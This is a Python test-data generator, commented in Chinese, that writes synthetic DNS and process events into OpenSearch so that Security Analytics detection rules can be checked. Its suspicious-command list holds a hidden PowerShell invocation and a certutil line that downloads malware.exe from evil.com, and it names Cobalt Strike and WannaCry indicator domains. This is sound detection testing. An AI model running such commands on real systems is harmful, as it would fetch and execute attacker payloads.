#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Security Analytics 测试事件生成器

功能说明：
    生成符合 ECS 格式的测试安全事件，用于测试 OpenSearch Security Analytics。
    生成的数据包括可疑事件和正常事件，可以触发检测规则。

生成的事件类型：
    - DNS 查询事件：包括可疑域名（Cobalt Strike、Telegram 等）
    - 进程创建事件：包括可疑命令（PowerShell、CertUtil 等）

使用场景：
    - 为 Security Analytics 测试生成数据
    - 验证检测规则是否正常工作
    - 为告警去重功能提供测试数据

环境要求：
    - OpenSearch 服务运行中
    - 已配置环境变量（OPENSEARCH_URL等）
    - 已创建 events-* 索引模式

运行方式：
    cd backend
    uv run python scripts/opensearch/generate_security_test_events.py

注意事项：
    - 生成的数据会存储到 OpenSearch，可能触发检测规则
    - 如果数据已存在，会自动跳过重复数据
    - 可以修改脚本中的域名和命令来生成不同的测试数据
"""

import sys
import io
from pathlib import Path
from datetime import datetime, timedelta
import uuid
import random

# Windows UTF-8 兼容
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# 添加 backend 目录到 Python 路径
backend_dir = Path(__file__).parent.parent.parent
sys.path.insert(0, str(backend_dir))

from app.services.opensearch import store_events

# 可疑域名列表（用于触发检测规则）
SUSPICIOUS_DOMAINS = [
    "aaa.stage.example.com",  # Cobalt Strike DNS Beaconing
    "post.123.example.com",   # Cobalt Strike DNS Beaconing
    "test.stage.123456.com",  # Cobalt Strike DNS Beaconing
    "telegram.org",            # Telegram Bot API
    "wannacry.killswitch.com", # Wannacry Killswitch
]

# 正常域名列表
NORMAL_DOMAINS = [
    "google.com",
    "github.com",
    "stackoverflow.com",
    "microsoft.com",
    "python.org",
]


def generate_dns_event(domain: str, is_suspicious: bool = False) -> dict:
    """生成 DNS 查询事件"""
    event_id = f"evt-{uuid.uuid4().hex[:16]}"
    timestamp = datetime.now() - timedelta(seconds=random.randint(0, 300))

    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": timestamp.isoformat() + "Z",
        "event": {
            "id": event_id,
            "kind": "event",
            "created": timestamp.isoformat() + "Z",
            "ingested": (timestamp + timedelta(seconds=1)).isoformat() + "Z",
            "category": ["network"],
            "type": ["info"],
            "action": "dns_query",
            "dataset": "netflow.dns"
        },
        "host": {
            "id": f"h-{uuid.uuid4().hex[:16]}",
            "name": f"test-host-{random.randint(1, 5)}"
        },
        "source": {
            "ip": f"10.0.0.{random.randint(1, 255)}",
            "port": random.randint(49152, 65535)
        },
        "destination": {
            "ip": "8.8.8.8",
            "port": 53
        },
        "dns": {
            "question": {
                "name": domain,
                "type": "A"
            },
            "response_code": "NOERROR"
        },
        "agent": {
            "name": "test-agent",
            "version": "1.0.0"
        }
    }


def generate_process_event(command_line: str, is_suspicious: bool = False) -> dict:
    """生成进程创建事件"""
    event_id = f"evt-{uuid.uuid4().hex[:16]}"
    timestamp = datetime.now() - timedelta(seconds=random.randint(0, 300))

    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": timestamp.isoformat() + "Z",
        "event": {
            "id": event_id,
            "kind": "event",
            "created": timestamp.isoformat() + "Z",
            "ingested": (timestamp + timedelta(seconds=1)).isoformat() + "Z",
            "category": ["process"],
            "type": ["start"],
            "action": "process_start",
            "dataset": "hostlog.process"
        },
        "host": {
            "id": f"h-{uuid.uuid4().hex[:16]}",
            "name": f"test-host-{random.randint(1, 5)}"
        },
        "process": {
            "entity_id": f"p-{uuid.uuid4().hex[:16]}",
            "pid": random.randint(1000, 9999),
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": command_line,
            "parent": {
                "entity_id": f"p-{uuid.uuid4().hex[:16]}",
                "pid": random.randint(100, 999),
                "executable": "C:\\Windows\\explorer.exe"
            }
        },
        "agent": {
            "name": "test-agent",
            "version": "1.0.0"
        }
    }


def generate_test_events(count: int = 20) -> list:
    """生成测试事件列表"""
    events = []

    # 生成 DNS 事件（包括可疑和正常的）
    suspicious_dns_count = count // 3  # 1/3 是可疑 DNS
    normal_dns_count = count // 3      # 1/3 是正常 DNS

    for _ in range(suspicious_dns_count):
        domain = random.choice(SUSPICIOUS_DOMAINS)
        events.append(generate_dns_event(domain, is_suspicious=True))

    for _ in range(normal_dns_count):
        domain = random.choice(NORMAL_DOMAINS)
        events.append(generate_dns_event(domain, is_suspicious=False))

    # 生成进程事件
    process_count = count - suspicious_dns_count - normal_dns_count
    suspicious_commands = [
        "powershell.exe -nop -w hidden -c whoami",
        "powershell.exe -enc <base64>",
        "cmd.exe /c certutil -urlcache -split -f http://evil.com/malware.exe",
    ]
    normal_commands = [
        "notepad.exe",
        "explorer.exe",
        "chrome.exe",
    ]

    for _ in range(process_count):
        if random.random() < 0.3:  # 30% 是可疑命令
            cmd = random.choice(suspicious_commands)
            events.append(generate_process_event(cmd, is_suspicious=True))
        else:
            cmd = random.choice(normal_commands)
            events.append(generate_process_event(cmd, is_suspicious=False))

    return events


def main():
    """主函数"""
    print("=" * 60)
    print("Security Analytics 测试事件生成器")
    print("=" * 60)

    # 生成测试事件
    event_count = 20
    print(f"\n生成 {event_count} 个测试事件...")
    events = generate_test_events(event_count)

    # 统计
    dns_events = [e for e in events if e.get("event", {}).get("action") == "dns_query"]
    suspicious_dns = [e for e in dns_events if e.get("dns", {}).get("question", {}).get("name") in SUSPICIOUS_DOMAINS]
    process_events = [e for e in events if e.get("event", {}).get("action") == "process_start"]

    print(f"  - DNS 事件: {len(dns_events)} 个（其中可疑: {len(suspicious_dns)} 个）")
    print(f"  - 进程事件: {len(process_events)} 个")

    # 存储到 OpenSearch
    print(f"\n存储事件到 OpenSearch...")
    try:
        result = store_events(events)
        success = result.get("success", 0)
        duplicated = result.get("duplicated", 0)
        failed = result.get("failed", 0)

        print(f"  - 成功存储: {success} 个")
        print(f"  - 跳过（重复）: {duplicated} 个")
        if failed > 0:
            print(f"  - 失败: {failed} 个")

        if success > 0:
            print(f"\n[OK] 测试数据生成成功！")
            print(f"\n提示:")
            print(f"  - Security Analytics 会每 1 分钟自动扫描")
            print(f"  - 等待 1-2 分钟后，运行以下命令查看 findings:")
            print(f"    uv run python scripts/opensearch/test_security_analytics_flow.py")
        elif duplicated > 0:
            print(f"\n[INFO] 所有事件都已存在（重复），跳过存储")
            print(f"  提示: 如果需要新数据，可以修改脚本中的域名或命令")
        else:
            print(f"\n[WARNING] 没有成功存储任何事件")

    except Exception as e:
        print(f"\n[ERROR] 存储失败: {e}")
        import traceback
        traceback.print_exc()
        return 1

    print("=" * 60)
    return 0


if __name__ == "__main__":
    sys.exit(main())
